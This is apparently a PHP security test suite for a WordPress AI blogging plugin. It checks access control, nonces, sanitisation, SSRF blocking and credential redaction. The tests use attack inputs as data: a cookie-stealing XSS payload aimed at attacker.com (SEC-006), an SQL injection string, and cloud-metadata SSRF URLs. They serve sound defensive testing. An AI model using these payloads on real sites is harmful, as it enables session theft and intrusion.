<?php
/**
 * BlogNexa AI - Mandatory Security Test Suite (SEC-001 to SEC-015)
 *
 * @package BlogNexaAI\Tests\Security
 */

declare(strict_types=1);

namespace BlogNexaAI\Tests\Security;

use BlogNexaAI\Security\PermissionManager;
use BlogNexaAI\Security\NonceManager;
use BlogNexaAI\Security\InputValidator;
use BlogNexaAI\Security\SecretManager;
use BlogNexaAI\Security\AuditLogger;
use BlogNexaAI\API\Controllers\SettingsController;
use BlogNexaAI\Infrastructure\HTTP\WordPressHTTPClient;
use BlogNexaAI\Lifecycle\Deactivator;
use BlogNexaAI\Lifecycle\Uninstaller;
use BlogNexaAI\Database\Installer;
use WP_REST_Request;

final class SecurityScenarioTest
{
    public static function run(): array
    {
        global $current_test_user_logged_in, $current_test_user_caps, $test_options;
        $results = [];

        // SEC-001: Anonymous access to private REST endpoint
        $current_test_user_logged_in = false;
        $check = PermissionManager::checkAccess();
        $results['SEC-001: Anonymous access rejected with 401'] = (is_wp_error($check) && $check->get_error_data()['status'] === 401);

        // SEC-002: Authenticated user without capability
        $current_test_user_logged_in = true;
        $current_test_user_caps = []; // No capabilities
        $check = PermissionManager::checkManageSettings();
        $results['SEC-002: Authenticated user without capability rejected with 403'] = (is_wp_error($check) && $check->get_error_data()['status'] === 403);

        // SEC-003: Invalid REST nonce
        $results['SEC-003: Invalid REST nonce rejected'] = !NonceManager::verifyRestNonce('forged_fake_nonce');

        // SEC-004: Unauthorized settings update
        $current_test_user_caps = [];
        $check = PermissionManager::checkManageSettings();
        $results['SEC-004: Unauthorized settings update forbidden'] = is_wp_error($check);

        // SEC-005: Unknown settings field
        $current_test_user_caps = [BLOGNEXA_CAP_MANAGE_SETTINGS => true];
        $settingsController = new SettingsController();
        $badReq = new WP_REST_Request(['injected_secret_field' => 'exploit']);
        $resp = $settingsController->updateSettings($badReq);
        $results['SEC-005: Unknown settings field rejected'] = (is_wp_error($resp) && $resp->get_error_code() === 'blognexa_unknown_setting');

        // SEC-006: Malicious HTML input
        $malicious = "<script>document.location='http://attacker.com?cookie='+document.cookie</script>SafeTitle";
        $clean = InputValidator::sanitizeText($malicious);
        $results['SEC-006: Malicious HTML input safely stripped'] = (!str_contains($clean, '<script>') && !str_contains($clean, 'attacker.com') && $clean === 'SafeTitle');

        // SEC-007: SQL injection-style input
        $sqlInjection = "' OR 1=1 -- -";
        $sanitizedKey = sanitize_key($sqlInjection);
        // Strips quotes, spaces, SQL delimiters, leaving harmless alphanumeric slug
        $results['SEC-007: SQL injection input safely neutralized'] = (!str_contains($sanitizedKey, "'") && !str_contains($sanitizedKey, " "));

        // SEC-008: Secret requested from settings API
        $getReq = new WP_REST_Request([]);
        $settingsResp = $settingsController->getSettings($getReq);
        $returnedData = $settingsResp->get_data()['data'];
        $hasSecret = isset($returnedData['api_key']) || isset($returnedData['signing_secret']);
        $results['SEC-008: Secrets never exposed in settings API response'] = (!$hasSecret);

        // SEC-009: Direct access protection
        $mainFile = file_get_contents(BLOGNEXA_PATH . 'blognexa-ai.php');
        $hasGuard = str_contains($mainFile, "defined('ABSPATH')") || str_contains($mainFile, "defined( 'ABSPATH' )");
        $results['SEC-009: Main entry point guards direct access'] = $hasGuard;

        // SEC-010: Uninstall without data-removal consent
        $test_options['blognexa_settings'] = ['general' => ['purge_data_on_uninstall' => false]];
        Uninstaller::uninstall();
        $results['SEC-010: Uninstall preserves user data without explicit consent'] = !empty($test_options['blognexa_settings']);

        // SEC-011: Deactivation
        Deactivator::deactivate();
        $results['SEC-011: Deactivation preserves all data'] = !empty($test_options['blognexa_settings']);

        // SEC-012: Unauthorized publication capability
        $current_test_user_caps = [BLOGNEXA_CAP_ACCESS => true];
        $pubCheck = PermissionManager::checkPublishBlog();
        $results['SEC-012: Unauthorized publication rejected with 403'] = (is_wp_error($pubCheck) && $pubCheck->get_error_data()['status'] === 403);

        // SEC-013: Unauthorized audit access
        $results['SEC-013: Non-admin users cannot access audit capability'] = (PermissionManager::can(BLOGNEXA_CAP_MANAGE_SETTINGS) === false);

        // SEC-014: Invalid backend URL (SSRF defense against loopback and cloud metadata)
        $httpClient = new WordPressHTTPClient();
        $resLocal = $httpClient->validateDestinationUrl('https://127.0.0.1/admin');
        $resMeta = $httpClient->validateDestinationUrl('https://169.254.169.254/latest/meta-data/');
        $results['SEC-014: SSRF guard blocks loopback & cloud metadata URLs'] = (is_wp_error($resLocal) && is_wp_error($resMeta));

        // SEC-015: Error log containing credentials
        $rawLogContext = [
            'username' => 'admin',
            'api_key'  => 'sk-live-secret-token-9876543210',
            'password' => 'MySuperSecretP@ssword',
        ];
        AuditLogger::log('test_log', 'test', '1', $rawLogContext);
        global $wpdb;
        $lastRow = end($wpdb->inserted_rows);
        $detailsLogged = $lastRow['data']['details'] ?? '';
        $results['SEC-015: Sensitive credentials redacted in audit/error logs'] = (
            !str_contains($detailsLogged, 'sk-live-secret-token-9876543210') &&
            !str_contains($detailsLogged, 'MySuperSecretP@ssword') &&
            str_contains($detailsLogged, '********')
        );

        return $results;
    }
}
